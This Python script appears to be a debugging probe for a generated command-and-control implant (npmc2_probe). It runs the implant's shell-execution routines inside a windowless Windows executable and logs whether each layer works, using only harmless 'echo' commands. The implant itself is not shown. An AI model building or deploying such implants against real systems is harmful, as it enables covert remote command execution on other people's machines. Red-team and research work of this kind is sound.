"""Probe 4: run the *actual generated implant* inside a --noconsole PE."""
import os
import sys
import traceback

LOG = r"C:\Py312\probe4.log"


def say(*p):
    with open(LOG, "a", encoding="utf-8", errors="replace") as f:
        f.write(" ".join(str(x) for x in p) + "\n")


sys.path.insert(0, r"C:\Py312")
import npmc2_probe as N  # the generated standalone implant


def main():
    say("module loaded; WINDOWS =", N.WINDOWS)
    N.redirect_output()
    say("after redirect_output: stdout=", type(sys.stdout).__name__,
        "stderr=", type(sys.stderr).__name__)

    imp = N.Implant("probe/pkg", token=None, interval=10, jitter=0, verbose=True)
    imp.cwd = os.path.expanduser("~")
    say("cwd:", imp.cwd, "exists:", os.path.isdir(imp.cwd))

    # the exact path the channel uses
    try:
        out = imp._exec("echo hi")
        say("_exec ->", repr(out)[:120])
    except Exception:
        say("_exec raised", traceback.format_exc()[-600:])

    # and the raw pieces, to see which layer breaks
    argv = imp._shell_argv("echo raw")
    say("argv:", argv)
    import subprocess
    try:
        r = subprocess.run(argv, cwd=imp.cwd, capture_output=True, timeout=30,
                           stdin=subprocess.DEVNULL)
        say("raw capture_output OK", repr(r.stdout[:20]))
    except Exception as e:
        say("raw capture_output FAIL", type(e).__name__, e)

    try:
        so, se, rc = imp._spawn_capture(argv, 30)
        say("_spawn_capture OK rc=", rc, repr(so[:20]))
    except Exception:
        say("_spawn_capture raised", traceback.format_exc()[-600:])
    say("end")


if __name__ == "__main__":
    main()
